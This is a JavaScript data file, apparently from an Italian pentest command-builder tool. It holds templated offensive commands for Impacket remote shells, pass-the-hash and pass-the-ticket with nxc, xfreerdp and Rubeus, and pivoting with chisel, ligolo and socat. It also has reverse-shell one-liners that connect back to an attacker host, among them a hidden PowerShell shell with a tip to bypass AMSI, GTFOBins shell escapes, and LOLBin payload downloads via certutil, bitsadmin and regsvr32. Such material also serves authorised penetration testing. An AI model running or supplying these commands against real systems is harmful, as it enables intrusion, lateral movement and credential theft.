        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "wmiexec.py <domain>/<user>:<password>@<ip>",
        "description": "Auth con password."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "wmiexec.py <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash."
      },
      {
        "id": "kerberos",
        "label": "Kerberos",
        "template": "wmiexec.py <domain>/<user>@<ip> -k -no-pass",
        "description": "Usa il ticket in `KRB5CCNAME` (Pass-the-Ticket)."
      }
    ]
  },
  {
    "id": "smbexec",
    "name": "smbexec.py — shell via share",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esecuzione semi-interattiva via servizio temporaneo e share: alternativa a psexec quando questo è bloccato.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "impacket",
      "smbexec"
    ],
    "template": "smbexec.py <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "dcomexec",
    "name": "dcomexec.py — via DCOM",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue tramite oggetti DCOM (`MMC20`, `ShellWindows`, `ShellBrowserWindow`): utile quando SMB/WMI sono monitorati.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc",
      "wmi"
    ],
    "tags": [
      "impacket",
      "dcomexec",
      "dcom"
    ],
    "template": "dcomexec.py <domain>/<user>:<password>@<ip>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "MMC20",
        "template": "dcomexec.py <domain>/<user>:<password>@<ip> -object MMC20",
        "description": "Oggetto DCOM `MMC20` (default)."
      },
      {
        "id": "shellwindows",
        "label": "ShellWindows",
        "template": "dcomexec.py <domain>/<user>:<password>@<ip> -object ShellWindows",
        "description": "Alternativa se `MMC20` è bloccato."
      },
      {
        "id": "hash",
        "label": "Pass-the-Hash",
        "template": "dcomexec.py <domain>/<user>@<ip> -hashes :<hash>",
        "description": "Pass-the-Hash."
      }
    ]
  },
  {
    "id": "atexec",
    "name": "atexec.py — via scheduled task",
    "category": "lateral",
    "subcategory": "remote-shells",
    "group": "Impacket Shells",
    "description": "Esegue un singolo comando creando un task pianificato temporaneo. Non interattivo: utile per un comando mirato.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "rpc"
    ],
    "tags": [
      "impacket",
      "atexec"
    ],
    "template": "atexec.py <domain>/<user>:<password>@<ip> 'whoami'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-pth",
    "name": "nxc — Pass-the-Hash spray",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "group": "PtH",
    "description": "Spruzza un NTLM hash su una lista di target per trovare dove l’utente è admin locale. `--local-auth` per account locali (riuso password admin locale).",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "pth"
    ],
    "template": "nxc smb targets.txt -u '<user>' -H '<hash>'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "aad3b...:<nt>"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SMB",
        "template": "nxc smb targets.txt -u '<user>' -H '<hash>'",
        "description": "Cerca `(Pwn3d!)` = admin locale su quel target."
      },
      {
        "id": "local",
        "label": "SMB local-auth",
        "template": "nxc smb targets.txt -u '<user>' -H '<hash>' --local-auth",
        "description": "Account locale (non di dominio): scova riuso della password admin locale."
      },
      {
        "id": "winrm",
        "label": "WinRM",
        "template": "nxc winrm targets.txt -u '<user>' -H '<hash>'",
        "description": "PtH su WinRM."
      }
    ]
  },
  {
    "id": "rdp-pth",
    "name": "xfreerdp — Pass-the-Hash (RDP)",
    "category": "lateral",
    "subcategory": "pass-the-hash",
    "group": "PtH",
    "description": "RDP con NTLM hash: funziona solo se sul target è abilitato il Restricted Admin Mode.",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "xfreerdp",
      "pth",
      "rdp"
    ],
    "template": "xfreerdp /v:<ip> /u:<user> /pth:<hash> /dynamic-resolution",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "<nt-hash>"
      }
    ]
  },
  {
    "id": "ptt-rubeus",
    "name": "Rubeus — dump & ptt (Windows)",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Da Windows: estrai i ticket Kerberos dalla memoria e iniettane uno nella sessione corrente (`ptt`).",
    "platform": "windows",
    "requires": [
      "ticket"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "rubeus",
      "ptt",
      "kerberos"
    ],
    "template": ".\\Rubeus.exe dump /nowrap",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Dump ticket",
        "template": ".\\Rubeus.exe dump /nowrap",
        "description": "`triage` per la lista, `dump /service:krbtgt` per i TGT."
      },
      {
        "id": "ptt",
        "label": "Inietta (ptt)",
        "template": ".\\Rubeus.exe ptt /ticket:<ticket>",
        "description": "Inietta un ticket base64/`.kirbi` nella sessione corrente."
      }
    ]
  },
  {
    "id": "ptt-import",
    "name": "Pass-the-Ticket — Linux",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Da Linux: punta `KRB5CCNAME` al ccache e autenticati con `-k -no-pass` (nessuna password, usa il ticket).",
    "platform": "linux",
    "requires": [
      "ticket"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "ptt",
      "kerberos"
    ],
    "template": "export KRB5CCNAME=ticket.ccache; psexec.py <domain>/<user>@<target> -k -no-pass",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "target",
        "label": "Target FQDN",
        "placeholder": "dc01.corp.local"
      }
    ]
  },
  {
    "id": "overpass-hash",
    "name": "Overpass-the-Hash — TGT da hash",
    "category": "lateral",
    "subcategory": "pass-the-ticket",
    "group": "PtT",
    "description": "Converte un NTLM hash in un TGT Kerberos: più stealth del PtH puro (usi Kerberos invece di NTLM).",
    "platform": "linux",
    "requires": [
      "hash"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "overpass-the-hash",
      "getTGT"
    ],
    "template": "getTGT.py <domain>/<user> -hashes :<hash>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "hash",
        "label": "NTLM hash",
        "ctx": "hash",
        "placeholder": "<nt-hash>"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (getTGT)",
        "template": "getTGT.py <domain>/<user> -hashes :<hash>",
        "description": "Salva un `.ccache`; poi `export KRB5CCNAME=...`."
      },
      {
        "id": "rubeus",
        "label": "Windows (Rubeus)",
        "template": ".\\Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt",
        "description": "Chiede il TGT e lo inietta (`/ptt`) in un colpo."
      }
    ]
  },
  {
    "id": "ssh-forward",
    "name": "SSH — port forwarding",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SSH",
    "description": "Tunnel attraverso un host pivot via SSH: locale (`-L`), remoto (`-R`) o SOCKS dinamico (`-D`).",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "ssh",
      "pivot",
      "port-forward"
    ],
    "template": "ssh -L <localport>:<targetip>:<targetport> <user>@<pivot> -N",
    "params": [
      {
        "key": "localport",
        "label": "Porta locale",
        "placeholder": "4445"
      },
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      },
      {
        "key": "targetport",
        "label": "Porta target",
        "placeholder": "445"
      },
      {
        "key": "user",
        "label": "User pivot",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "pivot",
        "label": "Pivot",
        "ctx": "ip",
        "placeholder": "10.10.14.50"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Local (-L)",
        "template": "ssh -L <localport>:<targetip>:<targetport> <user>@<pivot> -N",
        "description": "La porta del target interno diventa raggiungibile su `localhost:<localport>`."
      },
      {
        "id": "remote",
        "label": "Remote (-R)",
        "template": "ssh -R <localport>:127.0.0.1:<targetport> <user>@<pivot> -N",
        "description": "Espone una tua porta locale sul pivot."
      },
      {
        "id": "dynamic",
        "label": "SOCKS (-D)",
        "template": "ssh -D 9050 <user>@<pivot> -N",
        "description": "Proxy SOCKS su `9050`; usa con `proxychains`."
      }
    ]
  },
  {
    "id": "chisel-socks",
    "name": "chisel — tunnel SOCKS/forward",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Tunnel TCP/SOCKS quando non c’è SSH. Server sull’attacker, client sul pivot; reverse (`R:`) attraversa il NAT.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "chisel",
      "socks",
      "pivot"
    ],
    "template": "./chisel client <lhost>:8080 R:socks",
    "params": [
      {
        "key": "lhost",
        "label": "Attacker",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SOCKS (client)",
        "template": "./chisel client <lhost>:8080 R:socks",
        "description": "Crea un SOCKS5 sull’attacker (porta `1080`) → `proxychains`."
      },
      {
        "id": "server",
        "label": "Server (attacker)",
        "template": "./chisel server --reverse -p 8080",
        "description": "Da lanciare per primo sull’attacker."
      },
      {
        "id": "forward",
        "label": "Port forward",
        "template": "./chisel client <lhost>:8080 R:3389:172.16.8.50:3389",
        "description": "Inoltra una singola porta del target interno."
      }
    ]
  },
  {
    "id": "ligolo",
    "name": "Ligolo-ng — pivot a livello IP",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Pivot moderno senza proxychains: crea un’interfaccia `tun` e aggiungi una route verso la subnet interna, poi usi i tool normalmente.",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "ligolo",
      "pivot",
      "tun"
    ],
    "template": "./proxy -selfcert -laddr 0.0.0.0:11601",
    "params": [
      {
        "key": "lhost",
        "label": "Attacker",
        "ctx": "ip",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "subnet",
        "label": "Subnet target",
        "placeholder": "172.16.8.0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Proxy (attacker)",
        "template": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert -laddr 0.0.0.0:11601",
        "description": "Crea l’interfaccia `ligolo` e avvia il proxy."
      },
      {
        "id": "agent",
        "label": "Agent (pivot)",
        "template": "./agent -connect <lhost>:11601 -ignore-cert",
        "description": "Sul pivot: si connette al proxy. Poi nel proxy: `session`, `start`."
      },
      {
        "id": "route",
        "label": "Route (attacker)",
        "template": "sudo ip route add <subnet>/24 dev ligolo",
        "description": "Dopo `start`: la subnet diventa raggiungibile direttamente (no proxychains)."
      }
    ]
  },
  {
    "id": "proxychains",
    "name": "proxychains — usa il tunnel",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Instrada un tool attraverso il SOCKS del pivot. In `/etc/proxychains4.conf`: `dynamic_chain` + `socks5 127.0.0.1 1080`. Solo TCP, usa `-sT -Pn` con nmap.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "proxychains",
      "socks",
      "pivot"
    ],
    "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
    "params": [
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "nmap",
        "template": "proxychains -q nmap -sT -Pn -p- --min-rate 5000 <targetip>",
        "description": "Scan TCP attraverso il proxy."
      },
      {
        "id": "nxc",
        "label": "nxc",
        "template": "proxychains -q nxc smb <targetip> -u '<user>' -p '<password>' --shares",
        "description": "Qualsiasi tool TCP funziona dietro `proxychains`."
      }
    ]
  },
  {
    "id": "socat-relay",
    "name": "socat — relay sul pivot",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "Redirige una porta dal pivot verso un host interno (o inoltra una reverse shell verso l’attacker). Da eseguire sul pivot.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "socat",
      "relay",
      "pivot"
    ],
    "template": "socat TCP-LISTEN:<localport>,fork TCP:<targetip>:<targetport>",
    "params": [
      {
        "key": "localport",
        "label": "Porta sul pivot",
        "placeholder": "8443"
      },
      {
        "key": "targetip",
        "label": "Target interno",
        "placeholder": "172.16.8.50"
      },
      {
        "key": "targetport",
        "label": "Porta target",
        "placeholder": "443"
      }
    ]
  },
  {
    "id": "sshuttle",
    "name": "sshuttle — VPN su SSH",
    "category": "lateral",
    "subcategory": "pivoting",
    "group": "SOCKS Pivot",
    "description": "VPN trasparente su SSH: instrada un’intera subnet senza proxychains. Serve Python sul pivot.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "sshuttle",
      "pivot"
    ],
    "template": "sshuttle -r <user>@<ip> <subnet>",
    "params": [
      {
        "key": "user",
        "label": "SSH user",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "ip",
        "label": "Jump host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.20.0/24"
      }
    ]
  },
  {
    "id": "revshell",
    "name": "Reverse shell — one-liner",
    "category": "utilities",
    "subcategory": "reverse-shells",
    "group": "One-liner",
    "description": "One-liner pronti per richiamare il tuo listener. Per altre lingue/encoding usa revshells.com. Stabilizza poi la shell (vedi Exploitation).",
    "platform": "cross-platform",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "reverse-shell",
      "oneliner"
    ],
    "template": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Bash",
        "template": "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1",
        "description": "Richiede `/dev/tcp` (bash). Lancia da `bash -c`."
      },
      {
        "id": "python",
        "label": "Python",
        "template": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<lhost>\",<lport>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
        "description": "Già con PTY (`pty.spawn`)."
      },
      {
        "id": "nc",
        "label": "nc (mkfifo)",
        "template": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> <lport> >/tmp/f",
        "description": "Per `nc` senza `-e`."
      },
      {
        "id": "php",
        "label": "PHP",
        "template": "php -r '$sock=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "Utile dopo un file upload PHP."
      },
      {
        "id": "powershell",
        "label": "PowerShell",
        "template": "powershell -nop -W hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
        "description": "One-liner Windows; per stealth aggiungi un AMSI bypass prima."
      },
      {
        "id": "socat",
        "label": "socat",
        "template": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<lhost>:<lport>",
        "description": "Shell stabile; sull’attacker: `socat file:`tty`,raw,echo=0 tcp-listen:<lport>`."
      }
    ],
    "refs": [
      {
        "label": "revshells.com",
        "url": "https://www.revshells.com/"
      }
    ]
  },
  {
    "id": "gtfobins",
    "name": "GTFOBins — escape comuni",
    "category": "utilities",
    "subcategory": "gtfobins",
    "group": "Escape",
    "description": "Quando un binario è `sudo`/`SUID` o ha capabilities, cerca l’escape su GTFOBins. Qui le scappatoie più comuni per ottenere shell.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "gtfobins",
      "suid",
      "sudo"
    ],
    "template": "find . -exec /bin/sh \\; -quit",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "find",
        "template": "find . -exec /bin/sh \\; -quit",
        "description": "Con `sudo find` o find `SUID`."
      },
      {
        "id": "vim",
        "label": "vim",
        "template": "vim -c ':!/bin/sh'",
        "description": "Esce in shell dall’editor."
      },
      {
        "id": "awk",
        "label": "awk",
        "template": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "description": "Shell via `system()`."
      },
      {
        "id": "less",
        "label": "less / man",
        "template": "less /etc/profile",
        "description": "Dentro `less` digita `!/bin/sh`."
      }
    ],
    "refs": [
      {
        "label": "GTFOBins",
        "url": "https://gtfobins.github.io/"
      }
    ]
  },
  {
    "id": "lolbins",
    "name": "LOLBins — download Windows",
    "category": "utilities",
    "subcategory": "lolbins",
    "group": "Download",
    "description": "Binari Windows legittimi (LOLBAS) per scaricare/eseguire payload aggirando i controlli applicativi.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "lolbins",
      "lolbas",
      "certutil"
    ],
    "template": "certutil -urlcache -f http://<lhost>/<file> <file>",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "file",
        "label": "File",
        "placeholder": "shell.exe"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "certutil",
        "template": "certutil -urlcache -f http://<lhost>/<file> <file>",
        "description": "Download via `certutil` (molto comune)."
      },
      {
        "id": "bitsadmin",
        "label": "bitsadmin",
        "template": "bitsadmin /transfer job http://<lhost>/<file> C:\\Temp\\<file>",
        "description": "Download via servizio BITS."
      },
      {
        "id": "regsvr32",
        "label": "regsvr32 (squiblydoo)",
        "template": "regsvr32 /s /n /u /i:http://<lhost>/file.sct scrobj.dll",
        "description": "Esegue scriptlet remoto senza scrivere l’exe su disco."
      }
    ],
    "refs": [
      {
        "label": "LOLBAS Project",
        "url": "https://lolbas-project.github.io/"
      }
    ]
  },
  {
    "id": "hashcat-modes",
    "name": "hashcat — mode di riferimento",
    "category": "utilities",
    "subcategory": "cheatsheets",
    "group": "Cracking",
    "description": "Mode hashcat ricorrenti in un pentest:\n- `0` MD5 · `100` SHA1 · `1000` NTLM\n- `1800` sha512crypt (`$6$`, /etc/shadow) · `3200` bcrypt\n- `5600` NetNTLMv2 (Responder) · `13100` Kerberoast (TGS) · `18200` AS-REP\n- `22000` WPA-PBKDF2",
    "platform": "cross-platform",
    "requires": [
      "hash"
    ],
    "protocols": [],
    "tags": [
      "hashcat",
      "cheatsheet",
      "modes"
    ],
    "template": "hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt",
    "params": [
      {
        "key": "mode",
        "label": "Mode",
        "placeholder": "1000"
      }
    ],
    "refs": [
      {
        "label": "hashcat — example hashes",
        "url": "https://hashcat.net/wiki/doku.php?id=example_hashes"
      }
    ]
  },
  {
    "id": "curl-recipes",
    "name": "cURL — ricette utili",
    "category": "utilities",
    "subcategory": "cheatsheets",
    "group": "HTTP",
    "description": "Ricette `curl` per recon e testing: header del server, follow redirect, auth, login con cookie di sessione.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "curl",
      "http",
      "cheatsheet"
    ],
    "template": "curl -sI http://<ip>/",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "token",
        "label": "Token",
        "placeholder": "eyJhbGci..."
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Header server",
        "template": "curl -sI http://<ip>/",
        "description": "`-I` solo header (versione, tecnologie)."
      },
      {
        "id": "follow",
        "label": "Segui redirect",
        "template": "curl -skL http://<ip>/",
        "description": "`-L` segue i redirect, `-k` ignora TLS non valido."
      },
      {
        "id": "bearer",
        "label": "Bearer token",
        "template": "curl -s http://<ip>/api -H \"Authorization: Bearer <token>\"",
        "description": "Chiamata API autenticata."
      },
      {
        "id": "cookie",
        "label": "Login + cookie",
        "template": "curl -s -c cookies.txt -d 'user=admin&pass=admin' http://<ip>/login; curl -s -b cookies.txt http://<ip>/dashboard",
        "description": "`-c` salva il cookie di sessione, `-b` lo riusa."
      }
    ]
  }
];
window.COMMANDS = COMMANDS;
